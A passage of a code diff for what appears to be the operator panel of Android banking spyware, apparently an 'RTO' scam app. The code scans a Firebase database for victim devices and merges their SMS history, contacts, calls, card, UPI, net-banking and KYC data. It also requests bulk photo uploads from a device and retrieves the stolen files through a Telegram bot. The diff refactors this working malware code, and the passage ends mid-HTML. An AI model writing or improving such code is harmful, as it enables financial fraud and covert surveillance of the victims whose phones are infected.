-  var fields = ['device_model','device_id','device_manufacturer','device_brand','android_version','android_sdk','sim_info','battery','battery_status','first_install_timestamp','install_timestamp','device_hardware','device_fingerprint','status','last_seen','messages','sms_history','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','photos','installed_apps','installed_apps_telegram','notifications','device_board','serial_number','cpu_arch','storage','ip_address','online_time','offline_time','battery_info','sms','contacts','calls','device_name','phone','phone_number','number'];
+  if (typeof key === 'string' && (key.indexOf('DEV_') === 0 || key.indexOf('dev_') === 0)) return true;
+  var fields = ['device_model','device_id','deviceId','device_manufacturer','device_brand','android_version','android_sdk','sim_info','battery','battery_status','first_install_timestamp','install_timestamp','device_hardware','device_fingerprint','status','last_seen','messages','sms_history','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','photos','installed_apps','installed_apps_telegram','notifications','device_board','serial_number','cpu_arch','storage','ip_address','online_time','offline_time','battery_info','sms','contacts','calls','device_name','phone','phone_number','number','sim1_number','sim2_number','sim1_carrier','sim2_carrier'];
   for (var i = 0; i < fields.length; i++) { if (entry[fields[i]] !== undefined) return true; }
   var keys = Object.keys(entry);
-  for (var j = 0; j < keys.length; j++) {
-    var v = entry[keys[j]];
-    if (typeof v === 'string' && v.indexOf('%') !== -1) return true;
-  }
-  if (entry.messages && typeof entry.messages === 'object') return true;
-  if (entry.photos && typeof entry.photos === 'object') return true;
-  if (entry.sms_history && typeof entry.sms_history === 'object') return true;
+  for (var j = 0; j < keys.length; j++) { var v = entry[keys[j]]; if (typeof v === 'string' && v.indexOf('%') !== -1) return true; }
   if (typeof key === 'string') {
-    var kl = key.toLowerCase();
-    if (kl.indexOf('device') !== -1 || kl.indexOf('phone') !== -1 || kl.indexOf('mobile') !== -1 || kl.indexOf('client') !== -1) return true;
     if (/^\d{10,}$/.test(key)) return true;
     if (/^[a-f0-9]{16,}$/i.test(key)) return true;
     if (/^[a-f0-9-]{20,}$/i.test(key)) return true;
@@ -518,92 +454,96 @@ function isDeviceEntry(key, entry) {
   return false;
 }
 
-// ═══════════════════════════════════════════════════════════
-// HARD FAST SCAN — parallel + deep recursive
-// ═══════════════════════════════════════════════════════════
 function hardScan(onProgress) {
-  var commonPaths = [
-    '', // root
-    'device_info', 'devices', 'users', 'data', 'clients', 'device_data',
-    'all_devices', 'customers', 'accounts', 'nodes', 'app', 'app_data',
-    'sms', 'messages', 'records'
-  ];
-  var results = {};
-  var done = 0;
-  var total = commonPaths.length;
   return new Promise(function(resolve) {
-    commonPaths.forEach(function(path) {
-      var ref = path ? db.ref(path) : db.ref('/');
-      ref.once('value', function(snap) {
-        var val = snap.val();
-        if (val && typeof val === 'object') results[path || '__root__'] = val;
-        done++;
-        if (onProgress) onProgress(done, total);
-        if (done === total) resolve(mergeAllDevices(results));
-      }, function(err) {
-        done++;
-        if (onProgress) onProgress(done, total);
-        if (done === total) resolve(mergeAllDevices(results));
-      });
-    });
+    if (onProgress) onProgress(1, 2);
+    db.ref('/').once('value').then(function(snap) {
+      ROOT_SNAPSHOT = snap.val() || {};
+      if (onProgress) onProgress(2, 2);
+      resolve(buildDevicesFromRoot(ROOT_SNAPSHOT));
+    }).catch(function(err) { resolve({}); });
   });
 }
 
-// ═══════════════════════════════════════════════════════════
-// MERGE — sab paths se device + SMS data nikaalo
-// ═══════════════════════════════════════════════════════════
-function mergeAllDevices(resultsByPath) {
-  var found = {};
+function buildDevicesFromRoot(root) {
+  if (!root || typeof root !== 'object') return {};
   var skipKeys = ['admin_config','global_config','app_config','telegram_auto_config','config','settings'];
+  var deviceIds = {};
 
-  function collectNested(entry, target) {
-    ['messages','sms_history','photos','notifications','sms_notifications','installed_apps','installed_apps_telegram'].forEach(function(k) {
-      if (entry[k] && typeof entry[k] === 'object') {
-        if (!target[k]) target[k] = {};
-        Object.keys(entry[k]).forEach(function(nk) { target[k][nk] = entry[k][nk]; });
-      }
-    });
-    if (entry.sim_info) target.sim_info = Object.assign({}, target.sim_info || {}, entry.sim_info);
-    if (entry.forward_settings) target.forward_settings = Object.assign({}, target.forward_settings || {}, entry.forward_settings);
-    if (entry.apps_upload_command) target.apps_upload_command = entry.apps_upload_command;
-    ['device_model','device_name','device_id','android_version','android_sdk','battery','status','last_seen','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','device_note','ip_address','storage','device_manufacturer','device_brand','serial_number','first_install_timestamp','install_timestamp','device_hardware','device_fingerprint','device_board','cpu_arch','online_time','offline_time','battery_info'].forEach(function(k) {
-      if (entry[k] !== undefined && target[k] === undefined) target[k] = entry[k];
-    });
-  }
-
-  function walk(obj, path, depth) {
-    if (!obj || typeof obj !== 'object' || depth > 6) return;
+  function detectDevices(obj, path, depth) {
+    if (!obj || typeof obj !== 'object' || depth > 10) return;
     Object.keys(obj).forEach(function(key) {
       if (skipKeys.indexOf(key) !== -1 && depth <= 1) return;
       var entry = obj[key];
-      if (!entry || typeof entry !== 'object') return;
+      if (!entry || typeof entry !== 'object' || Array.isArray(entry)) return;
       var fullPath = path ? path + '/' + key : key;
       if (isDeviceEntry(key, entry)) {
-        if (!found[key]) found[key] = { data: {}, path: fullPath };
-        Object.keys(entry).forEach(function(k) {
-          if (found[key].data[k] === undefined) found[key].data[k] = entry[k];
-          else if (entry[k] && typeof entry[k] === 'object' && !Array.isArray(entry[k])) {
-            if (found[key].data[k] && typeof found[key].data[k] === 'object') {
-              Object.keys(entry[k]).forEach(function(nk) {
-                if (found[key].data[k][nk] === undefined) found[key].data[k][nk] = entry[k][nk];
-              });
-            }
-          }
-        });
-        collectNested(entry, found[key].data);
-        return;
+        var did = entry.device_id || entry.deviceId || key;
+        did = String(did);
+        if (!deviceIds[did]) deviceIds[did] = { id: did, primaryPath: fullPath, key: key, entries: [entry] };
+        else deviceIds[did].entries.push(entry);
       }
-      if (depth < 6) walk(entry, fullPath, depth + 1);
+      if (depth < 10) detectDevices(entry, fullPath, depth + 1);
     });
   }
-  Object.keys(resultsByPath).forEach(function(pathKey) {
-    var path = pathKey === '__root__' ? '' : pathKey;
-    walk(resultsByPath[pathKey], path, 0);
+  detectDevices(root, '', 0);
+
+  var finalDevices = {};
+  Object.keys(deviceIds).forEach(function(did) {
+    var info = deviceIds[did];
+    var collected = [];
+    var visited = new Set();
+
+    function findIdInTree(obj, path, depth) {
+      if (!obj || typeof obj !== 'object' || depth > 12) return;
+      if (visited.has(obj)) return;
+      visited.add(obj);
+      Object.keys(obj).forEach(function(key) {
+        var entry = obj[key];
+        var fullPath = path ? path + '/' + key : key;
+        if (key === did) {
+          if (entry && typeof entry === 'object' && !Array.isArray(entry)) collected.push({ path: fullPath, data: entry, type: 'key' });
+        }
+        if (entry && typeof entry === 'object' && !Array.isArray(entry)) {
+          var idFields = ['device_id','deviceId','id','device','imei','android_id','serial','device_serial','phone','phone_number','number'];
+          for (var fi = 0; fi < idFields.length; fi++) {
+            if (String(entry[idFields[fi]]) === did) { collected.push({ path: fullPath, data: entry, type: 'field:' + idFields[fi] }); break; }
+          }
+          findIdInTree(entry, fullPath, depth + 1);
+        }
+      });
+    }
+    findIdInTree(root, '', 0);
+    info.entries.forEach(function(e) { collected.push({ path: info.primaryPath, data: e, type: 'primary' }); });
+
+    var merged = {};
+    collected.forEach(function(hit) { if (hit.data && typeof hit.data === 'object') deepMergeInto(merged, hit.data); });
+    if (!merged.device_id) merged.device_id = did;
+    if (!merged.device_name && !merged.device_model) merged.device_name = did;
+    finalDevices[did] = { data: merged, path: info.primaryPath, collectedPaths: collected.map(function(h) { return h.path; }) };
   });
-  return found;
+  return finalDevices;
 }
 
-// ═══ SMS HIGHLIGHT ═══
+function deepMergeInto(target, source) {
+  if (!source || typeof source !== 'object') return;
+  Object.keys(source).forEach(function(k) {
+    var sv = source[k];
+    if (sv === undefined || sv === null) return;
+    var tv = target[k];
+    if (tv === undefined) {
+      if (sv && typeof sv === 'object') {
+        if (Array.isArray(sv)) target[k] = sv.slice();
+        else { target[k] = {}; deepMergeInto(target[k], sv); }
+      } else target[k] = sv;
+    } else if (sv && typeof sv === 'object' && !Array.isArray(sv) && tv && typeof tv === 'object' && !Array.isArray(tv)) {
+      deepMergeInto(tv, sv);
+    } else if (Array.isArray(sv) && Array.isArray(tv)) {
+      sv.forEach(function(item) { if (!tv.some(function(x) { return JSON.stringify(x) === JSON.stringify(item); })) tv.push(item); });
+    }
+  });
+}
+
 function highlightSms(body) {
   if (!body) return '';
   var s = body;
@@ -616,53 +556,18 @@ function highlightSms(body) {
   return s;
 }
 
-// ═══ INLINE PROGRESS ═══
-function startInlineProgress(type, total, statusText) {
-  var suffix = type === 'photos' ? 'Photos' : 'Apps';
-  var container = document.getElementById('inlineProgress' + suffix);
-  if (!container) return;
-  container.classList.add('active');
-  updateInlineProgress(type, 0, total, statusText);
+function startInlineProgress(t, n, s) { var c = document.getElementById('inlineProgress' + (t==='photos'?'Photos':'Apps')); if (c) { c.classList.add('active'); updateInlineProgress(t, 0, n, s); } }
+function updateInlineProgress(t, d, n, s) {
+  var sfx = t==='photos'?'Photos':'Apps';
+  var b = document.getElementById('inlineProgressBar'+sfx), p = document.getElementById('inlineProgressPercent'+sfx), i = document.getElementById('inlineProgressIcon'+sfx), st = document.getElementById('inlineProgressStats'+sfx);
+  if (!b) return;
+  var pct = n>0 ? Math.round(d/n*100) : 0;
+  b.style.width = pct+'%'; p.textContent = pct+'%'; if (s && i) i.textContent = s; if (st) st.textContent = d+' / '+n+' uploaded';
+  if (pct>=100) { b.className='inline-progress-bar-fill done'; if(i)i.className='inline-progress-status done'; } else { b.className='inline-progress-bar-fill'; if(i)i.className='inline-progress-status'; }
 }
-function updateInlineProgress(type, done, total, statusText) {
-  var suffix = type === 'photos' ? 'Photos' : 'Apps';
-  var bar = document.getElementById('inlineProgressBar' + suffix);
-  var percent = document.getElementById('inlineProgressPercent' + suffix);
-  var icon = document.getElementById('inlineProgressIcon' + suffix);
-  var stats = document.getElementById('inlineProgressStats' + suffix);
-  if (!bar) return;
-  var pct = total > 0 ? Math.round((done / total) * 100) : 0;
-  bar.style.width = pct + '%';
-  percent.textContent = pct + '%';
-  if (statusText && icon) icon.textContent = statusText;
-  if (stats) stats.textContent = done + ' / ' + total + ' uploaded';
-  if (pct >= 100) {
-    bar.className = 'inline-progress-bar-fill done';
-    if (icon) icon.className = 'inline-progress-status done';
-    if (percent) percent.className = 'inline-progress-percent done';
-  } else {
-    bar.className = 'inline-progress-bar-fill';
-    if (icon) icon.className = 'inline-progress-status';
-    if (percent) percent.className = 'inline-progress-percent';
-  }
-}
-function updateInlineProgressError(type, errorText) {
-  var suffix = type === 'photos' ? 'Photos' : 'Apps';
-  var bar = document.getElementById('inlineProgressBar' + suffix);
-  var icon = document.getElementById('inlineProgressIcon' + suffix);
-  var percent = document.getElementById('inlineProgressPercent' + suffix);
-  if (!bar) return;
-  bar.className = 'inline-progress-bar-fill err';
-  if (icon) { icon.textContent = '❌ ' + (errorText || 'Failed'); icon.className = 'inline-progress-status err'; }
-  if (percent) percent.className = 'inline-progress-percent err';
-}
-function endInlineProgress(type) {
-  var suffix = type === 'photos' ? 'Photos' : 'Apps';
-  var container = document.getElementById('inlineProgress' + suffix);
-  if (container) container.classList.remove('active');
-}
+function updateInlineProgressError(t, e) { var sfx=t==='photos'?'Photos':'Apps'; var b=document.getElementById('inlineProgressBar'+sfx), i=document.getElementById('inlineProgressIcon'+sfx); if(b){b.className='inline-progress-bar-fill err';if(i){i.textContent='❌ '+e;i.className='inline-progress-status err';}} }
+function endInlineProgress(t) { var c = document.getElementById('inlineProgress' + (t==='photos'?'Photos':'Apps')); if (c) c.classList.remove('active'); }
 
-// ═══ TELEGRAM ═══
 function initTelegramConfig() {
   if (telegramConfigListener) { try { telegramConfigListener.off(); } catch(e) {} }
   telegramConfigListener = db.ref('global_config/telegram_config');
@@ -675,337 +580,93 @@ function initTelegramConfig() {
   });
 }
 function telegramGetFileUrl(fileId) {
-  var cached = telegramUrlCache[fileId];
-  if (cached && Date.now() - cached.time < 30 * 60 * 1000) return Promise.resolve(cached.url);
+  var c = telegramUrlCache[fileId];
+  if (c && Date.now()-c.time < 1800000) return Promise.resolve(c.url);
   if (!TELEGRAM_CONFIG.enabled) return Promise.reject('Telegram not configured');
-  var url = 'https://api.telegram.org/bot' + TELEGRAM_CONFIG.botToken + '/getFile?file_id=' + encodeURIComponent(fileId);
-  return fetch(url).then(function(r) { return r.json(); }).then(function(j) {
-    if (!j.ok) throw new Error(j.description || 'getFile failed');
-    var fileUrl = 'https://api.telegram.org/file/bot' + TELEGRAM_CONFIG.botToken + '/' + j.result.file_path;
-    telegramUrlCache[fileId] = { url: fileUrl, time: Date.now() };
-    return fileUrl;
+  return fetch('https://api.telegram.org/bot'+TELEGRAM_CONFIG.botToken+'/getFile?file_id='+encodeURIComponent(fileId)).then(function(r){return r.json();}).then(function(j){
+    if (!j.ok) throw new Error(j.description);
+    var u = 'https://api.telegram.org/file/bot'+TELEGRAM_CONFIG.botToken+'/'+j.result.file_path;
+    telegramUrlCache[fileId]={url:u,time:Date.now()}; return u;
   });
 }
-function telegramFetchJson(fileId) { return telegramGetFileUrl(fileId).then(function(url) { return fetch(url).then(function(r) { return r.json(); }); }); }
+function telegramFetchJson(f) { return telegramGetFileUrl(f).then(function(u){return fetch(u).then(function(r){return r.json();});}); }
 function openTelegramSettings() {
-  var old = document.getElementById('tgSettingsDialog'); if (old) old.remove();
-  var tok = TELEGRAM_CONFIG.botToken || '', cid = TELEGRAM_CONFIG.chatId || '';
-  var html = '<div style="position:fixed; inset:0; background:rgba(15,23,42,0.6); z-index:6000; display:flex; align-items:center; justify-content:center; padding:20px; backdrop-filter:blur(3px);" id="tgSettingsDialog" onclick="if(event.target===this) closeTelegramSettings()"><div style="background:#FFFFFF; border:1px solid #E2E8F0; border-radius:16px; padding:22px; max-width:460px; width:100%; box-shadow:0 20px 50px rgba(0,0,0,0.2);"><h3 style="color:#1E40AF; font-size:16px; margin-bottom:8px; font-weight:700;">⚙️ Telegram Configuration</h3><div style="color:#64748B; font-size:11px; margin-bottom:18px;">Photo/Apps upload ke liye. App isi config ko Firebase se fetch karega.</div><label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:700;">Bot Token</label><input type="text" id="tgToken" value="' + esc(tok) + '" placeholder="123456789:ABCdef..." style="width:100%; padding:12px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:10px; color:#1E293B; font-size:12px; font-family:monospace; margin-top:6px; margin-bottom:14px;"><label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:700;">Chat ID</label><input type="text" id="tgChat" value="' + esc(cid) + '" placeholder="-1001234567890" style="width:100%; padding:12px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:10px; color:#1E293B; font-size:12px; font-family:monospace; margin-top:6px; margin-bottom:14px;"><div id="tgSettingsStatus" style="font-size:11px; color:#64748B; margin-bottom:14px; min-height:16px; font-weight:600;"></div><div style="display:flex; gap:8px;"><button onclick="closeTelegramSettings()" style="flex:1; padding:13px; background:#F1F5F9; color:#334155; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer;">CANCEL</button><button onclick="testTelegramFromDialog()" style="flex:1; padding:13px; background:#F59E0B; color:#FFFFFF; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer;">🧪 TEST</button><button onclick="saveTelegramFromDialog()" style="flex:1; padding:13px; background:#059669; color:white; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer;">💾 SAVE</button></div></div></div>';
-  var div = document.createElement('div'); div.innerHTML = html; document.body.appendChild(div.firstChild);
+  var old=document.getElementById('tgSettingsDialog'); if(old)old.remove();
+  var tok=TELEGRAM_CONFIG.botToken||'', cid=TELEGRAM_CONFIG.chatId||'';
+  var html='<div style="position:fixed;inset:0;background:rgba(15,23,42,0.6);z-index:6000;display:flex;align-items:center;justify-content:center;padding:20px;" id="tgSettingsDialog" onclick="if(event.target===this)closeTelegramSettings()"><div style="background:#FFF;border-radius:16px;padding:22px;max-width:460px;width:100%;"><h3 style="color:#1E40AF;font-size:16px;margin-bottom:8px;">⚙️ Telegram</h3><label style="color:#64748B;font-size:10px;text-transform:uppercase;font-weight:700;">Bot Token</label><input type="text" id="tgToken" value="'+esc(tok)+'" style="width:100%;padding:12px;background:#F8FAFC;border:1px solid #E2E8F0;border-radius:10px;margin:6px 0 14px;"><label style="color:#64748B;font-size:10px;text-transform:uppercase;font-weight:700;">Chat ID</label><input type="text" id="tgChat" value="'+esc(cid)+'" style="width:100%;padding:12px;background:#F8FAFC;border:1px solid #E2E8F0;border-radius:10px;margin:6px 0 14px;"><div id="tgSettingsStatus" style="font-size:11px;color:#64748B;margin-bottom:14px;min-height:16px;"></div><div style="display:flex;gap:8px;"><button onclick="closeTelegramSettings()" style="flex:1;padding:13px;background:#F1F5F9;color:#334155;border:none;border-radius:10px;cursor:pointer;font-weight:700;">CANCEL</button><button onclick="testTelegramFromDialog()" style="flex:1;padding:13px;background:#F59E0B;color:#FFF;border:none;border-radius:10px;cursor:pointer;font-weight:700;">TEST</button><button onclick="saveTelegramFromDialog()" style="flex:1;padding:13px;background:#059669;color:white;border:none;border-radius:10px;cursor:pointer;font-weight:700;">SAVE</button></div></div></div>';
+  var div=document.createElement('div'); div.innerHTML=html; document.body.appendChild(div.firstChild);
 }
-function closeTelegramSettings() { var el = document.getElementById('tgSettingsDialog'); if (el) el.remove(); }
-function saveTelegramFromDialog() {
-  var tok = document.getElementById('tgToken').value.trim(), cid = document.getElementById('tgChat').value.trim();
-  var statusEl = document.getElementById('tgSettingsStatus');
-  if (!tok || !cid) { statusEl.textContent = '❌ Both fields required'; statusEl.style.color = '#DC2626'; return; }
-  statusEl.textContent = '⏳ Saving...'; statusEl.style.color = '#D97706';
-  db.ref('global_config/telegram_config').update({ bot_token: tok, chat_id: cid, enabled: true, updated_at: Date.now() }).then(function() { statusEl.textContent = '✅ Saved!'; statusEl.style.color = '#059669'; }).catch(function(e) { statusEl.textContent = '❌ ' + e.message; statusEl.style.color = '#DC2626'; });
-}
-function testTelegramFromDialog() {
-  var tok = document.getElementById('tgToken').value.trim(), cid = document.getElementById('tgChat').value.trim();
-  var statusEl = document.getElementById('tgSettingsStatus');
-  if (!tok || !cid) { statusEl.textContent = '❌ Both fields required'; statusEl.style.color = '#DC2626'; return; }
-  statusEl.textContent = '⏳ Testing...'; statusEl.style.color = '#D97706';
-  var url = 'https://api.telegram.org/bot' + tok + '/sendMessage';
-  var body = new URLSearchParams(); body.append('chat_id', cid); body.append('text', '🧪 RTO Panel Test\n\nConnected: ' + new Date().toLocaleString());
-  fetch(url, { method: 'POST', body: body }).then(function(r) { return r.json(); }).then(function(j) {
-    if (j.ok) { statusEl.textContent = '✅ Test sent!'; statusEl.style.color = '#059669'; }
-    else { statusEl.textContent = '❌ ' + (j.description || 'Failed'); statusEl.style.color = '#DC2626'; }
-  }).catch(function(e) { statusEl.textContent = '❌ ' + e.message; statusEl.style.color = '#DC2626'; });
-}
+function closeTelegramSettings() { var el=document.getElementById('tgSettingsDialog'); if(el)el.remove(); }
+function saveTelegramFromDialog() { var t=document.getElementById('tgToken').value.trim(), c=document.getElementById('tgChat').value.trim(); var s=document.getElementById('tgSettingsStatus'); if(!t||!c){s.textContent='❌ Both required';s.style.color='#DC2626';return;} db.ref('global_config/telegram_config').update({bot_token:t,chat_id:c,enabled:true,updated_at:Date.now()}).then(function(){s.textContent='✅ Saved';s.style.color='#059669';}); }
+function testTelegramFromDialog() { var t=document.getElementById('tgToken').value.trim(), c=document.getElementById('tgChat').value.trim(); var s=document.getElementById('tgSettingsStatus'); if(!t||!c)return; s.textContent='⏳ Testing...'; var b=new URLSearchParams();b.append('chat_id',c);b.append('text','Test OK'); fetch('https://api.telegram.org/bot'+t+'/sendMessage',{method:'POST',body:b}).then(function(r){return r.json();}).then(function(j){s.textContent=j.ok?'✅ Sent':'❌ '+j.description;s.style.color=j.ok?'#059669':'#DC2626';}); }
 
-// ═══ DELETE ═══
-function deleteSinglePhoto(photoKey) {
-  var p = photos[photoKey]; if (!p) return;
-  if (!confirm('Delete "' + (p.name || 'photo') + '"?')) return;
-  var el = document.querySelector('[data-p="' + photoKey + '"]');
-  if (el) { el.classList.add('deleting'); var btn = el.querySelector('.pdelete'); if (btn) { btn.disabled = true; btn.textContent = '⏳'; } }
-  db.ref('device_info/' + curId + '/photos/' + photoKey).remove().then(function() {
-    delete photos[photoKey];
-    document.getElementById('cPhotos').textContent = Object.keys(photos).length;
-    renderPhotos();
-  }).catch(function(e) { alert('❌ ' + e.message); if (el) { el.classList.remove('deleting'); var btn = el.querySelector('.pdelete'); if (btn) { btn.disabled = false; btn.textContent = '✕'; } } });
-}
-var deleteScope = 'all';
+function deleteSinglePhoto(k) { var p=photos[k]; if(!p)return; if(!confirm('Delete?'))return; db.ref(basePathOf(curId)+'/photos/'+k).remove().then(function(){delete photos[k];document.getElementById('cPhotos').textContent=Object.keys(photos).length;renderPhotos();}); }
+var deleteScope='all';
 function openFastDeleteDialog() {
-  var counts = { all: 0, camera: 0, screenshot: 0, document: 0, picture: 0 };
-  Object.values(photos).forEach(function(p) {
-    if (!p || (!p.telegram_file_id && !p.url && !p.base64)) return;
-    counts.all++;
-    var f = (p.folder || '').toLowerCase();
-    if (f.indexOf('camera') !== -1 || f.indexOf('dcim') !== -1) counts.camera++;
-    else if (f.indexOf('screenshot') !== -1 || f.indexOf('screen_shot') !== -1) counts.screenshot++;
-    else if (f.indexOf('document') !== -1) counts.document++;
-    else if (f.indexOf('picture') !== -1) counts.picture++;
-  });
-  var listEl = document.getElementById('delScopeList');
-  var options = [
-    { id: 'all', label: '🗑️ ALL Photos', count: counts.all },
-    { id: 'camera', label: '📷 Camera', count: counts.camera },
-    { id: 'screenshot', label: '📸 Screenshot', count: counts.screenshot },
-    { id: 'document', label: '📄 Document', count: counts.document },
-    { id: 'picture', label: '🖼️ Picture', count: counts.picture }
-  ];
-  listEl.innerHTML = options.map(function(o) { return '<button class="cf-sim-btn' + (o.id === 'all' ? ' active' : '') + '" data-scope="' + o.id + '" style="text-align:left;padding:13px;">' + o.label + ' <span style="color:#DC2626;font-size:10px;">(' + o.count + ')</span></button>'; }).join('');
-  listEl.querySelectorAll('[data-scope]').forEach(function(btn) { btn.addEventListener('click', function() { listEl.querySelectorAll('[data-scope]').forEach(function(b) { b.classList.remove('active'); }); this.classList.add('active'); deleteScope = this.getAttribute('data-scope'); }); });
-  deleteScope = 'all';
-  document.getElementById('delScopeOverlay').classList.add('active');
+  var counts={all:0,camera:0,screenshot:0,document:0,picture:0};
+  Object.values(photos).forEach(function(p){ if(!p||(!p.telegram_file_id&&!p.url&&!p.base64))return; counts.all++; var f=(p.folder||'').toLowerCase(); if(f.indexOf('camera')!==-1||f.indexOf('dcim')!==-1)counts.camera++; else if(f.indexOf('screenshot')!==-1)counts.screenshot++; else if(f.indexOf('document')!==-1)counts.document++; else if(f.indexOf('picture')!==-1)counts.picture++; });
+  var options=[{id:'all',label:'🗑️ ALL',count:counts.all},{id:'camera',label:'📷 Camera',count:counts.camera},{id:'screenshot',label:'📸 SS',count:counts.screenshot},{id:'document',label:'📄 Doc',count:counts.document},{id:'picture',label:'🖼️ Pic',count:counts.picture}];
+  var l=document.getElementById('delScopeList'); l.innerHTML=options.map(function(o){return '<button class="cf-sim-btn'+(o.id==='all'?' active':'')+'" data-scope="'+o.id+'" style="text-align:left;padding:13px;">'+o.label+' <span style="color:#DC2626;font-size:10px;">('+o.count+')</span></button>';}).join('');
+  l.querySelectorAll('[data-scope]').forEach(function(b){b.addEventListener('click',function(){l.querySelectorAll('[data-scope]').forEach(function(x){x.classList.remove('active');});this.classList.add('active');deleteScope=this.getAttribute('data-scope');});});
+  deleteScope='all'; document.getElementById('delScopeOverlay').classList.add('active');
 }
 function closeFastDeleteDialog() { document.getElementById('delScopeOverlay').classList.remove('active'); }
 function confirmFastDelete() {
-  var toDelete = [];
-  Object.entries(photos).forEach(function(entry) {
-    var key = entry[0], p = entry[1];
-    if (!p || (!p.telegram_file_id && !p.url && !p.base64)) return;
-    var f = (p.folder || '').toLowerCase();
-    var match = false;
-    if (deleteScope === 'all') match = true;
-    else if (deleteScope === 'camera') match = f.indexOf('camera') !== -1 || f.indexOf('dcim') !== -1;
-    else if (deleteScope === 'screenshot') match = f.indexOf('screenshot') !== -1 || f.indexOf('screen_shot') !== -1;
-    else if (deleteScope === 'document') match = f.indexOf('document') !== -1;
-    else if (deleteScope === 'picture') match = f.indexOf('picture') !== -1;
-    if (match) toDelete.push({ key: key, photo: p });
-  });
-  if (toDelete.length === 0) { alert('No photos'); return; }
-  if (!confirm('🚀 Delete ' + toDelete.length + ' photos?')) return;
+  var td=[];
+  Object.entries(photos).forEach(function(e){var k=e[0],p=e[1];if(!p||(!p.telegram_file_id&&!p.url&&!p.base64))return;var f=(p.folder||'').toLowerCase();var m=false;if(deleteScope==='all')m=true;else if(deleteScope==='camera')m=f.indexOf('camera')!==-1||f.indexOf('dcim')!==-1;else if(deleteScope==='screenshot')m=f.indexOf('screenshot')!==-1;else if(deleteScope==='document')m=f.indexOf('document')!==-1;else if(deleteScope==='picture')m=f.indexOf('picture')!==-1;if(m)td.push({key:k,photo:p});});
+  if(td.length===0){alert('No photos');return;}
+  if(!confirm('Delete '+td.length+' photos?'))return;
   closeFastDeleteDialog();
-  executeFastDelete(toDelete);
-}
-function executeFastDelete(items) {
-  var overlay = document.getElementById('delProgressOverlay');
-  overlay.classList.add('active');
-  document.getElementById('delProgressBar').style.background = 'linear-gradient(90deg,#EF4444,#F59E0B)';
-  document.getElementById('delProgressBar').style.width = '0%';
-  var total = items.length;
-  var log = document.getElementById('delProgressLog');
-  document.getElementById('delProgressText').textContent = 'Deleting ' + total + ' from Firebase...';
-  log.textContent = '⚡ Batched delete in progress...';
-  var updates = {};
-  items.forEach(function(item) { updates['device_info/' + curId + '/photos/' + item.key] = null; });
-  db.ref().update(updates).then(function() {
-    document.getElementById('delProgressBar').style.width = '100%';
-    document.getElementById('delProgressText').textContent = '✅ Done: ' + total + ' deleted';
-    log.textContent = 'Complete!\n' + total + ' photos deleted.';
-    items.forEach(function(item) { delete photos[item.key]; });
-    renderPhotos();
-    setTimeout(function() { overlay.classList.remove('active'); }, 1500);
-  }).catch(function(e) {
-    document.getElementById('delProgressBar').style.width = '100%';
-    document.getElementById('delProgressBar').style.background = '#EF4444';
-    document.getElementById('delProgressText').textContent = '❌ Failed';
-    log.textContent = '❌ ' + e.message;
-  });
+  var ov=document.getElementById('delProgressOverlay'); ov.classList.add('active');
+  document.getElementById('delProgressBar').style.width='0%'; document.getElementById('delProgressText').textContent='Deleting '+td.length+'...';
+  var updates={}; td.forEach(function(i){updates[basePathOf(curId)+'/photos/'+i.key]=null;});
+  db.ref().update(updates).then(function(){ document.getElementById('delProgressBar').style.width='100%'; document.getElementById('delProgressText').textContent='✅ Done'; td.forEach(function(i){delete photos[i.key];}); renderPhotos(); setTimeout(function(){ov.classList.remove('active');},1500); });
 }
 
-// ═══ PHOTO UPLOAD ═══
-var photoFilter = 'camera', photoQuantity = 100, photoOrder = 'newest';
+var photoFilter='camera', photoQuantity=100, photoOrder='newest';
 function openPhotoUploadDialog() {
-  if (!curId) return;
-  var old = document.getElementById('photoDialog'); if (old) old.remove();
-  var html = '<div style="position:fixed; inset:0; background:rgba(15,23,42,0.6); z-index:5000; display:flex; align-items:center; justify-content:center; padding:20px; backdrop-filter:blur(3px);" id="photoDialog" onclick="if(event.target===this) closePhotoDialog()"><div style="background:#FFFFFF; border:1px solid #E2E8F0; border-radius:16px; padding:22px; max-width:460px; width:100%; box-shadow:0 20px 50px rgba(0,0,0,0.2);"><h3 style="color:#1E40AF; font-size:16px; margin-bottom:18px; font-weight:700;">📤 Upload Request</h3><label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:700;">Filter</label><div style="display:flex; gap:6px; margin-top:6px; margin-bottom:14px; flex-wrap:wrap;"><button class="pfilter-btn active" data-f="camera" style="flex:1; padding:11px; background:#2563EB; color:white; border:none; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; min-width:80px;">📷 Camera</button><button class="pfilter-btn" data-f="screenshot" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; min-width:80px;">📸 SS</button><button class="pfilter-btn" data-f="document" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; min-width:80px;">📄 Doc</button><button class="pfilter-btn" data-f="picture" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:11px; font-weight:700; cursor:pointer; min-width:80px;">🖼️ Pic</button></div><label style="color:#64748B; font-size:10px; text-transform:uppercase; font-weight:700;">Quantity</label><div style="display:flex; gap:6px; margin-top:6px; margin-bottom:8px;"><button class="pqty-btn" data-q="50" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:12px; font-weight:700; cursor:pointer;">50</button><button class="pqty-btn active" data-q="100" style="flex:1; padding:11px; background:#2563EB; color:white; border:none; border-radius:9px; font-size:12px; font-weight:700; cursor:pointer;">100</button><button class="pqty-btn" data-q="500" style="flex:1; padding:11px; background:#F8FAFC; color:#334155; border:1px solid #E2E8F0; border-radius:9px; font-size:12px; font-weight:700; cursor:pointer;">500</button></div><input type="number" id="customQty" placeholder="✏️ Custom quantity (e.g. 2000)" min="1" max="10000" style="width:100%; padding:12px; background:#F8FAFC; border:1px solid #E2E8F0; border-radius:9px; color:#1E293B; 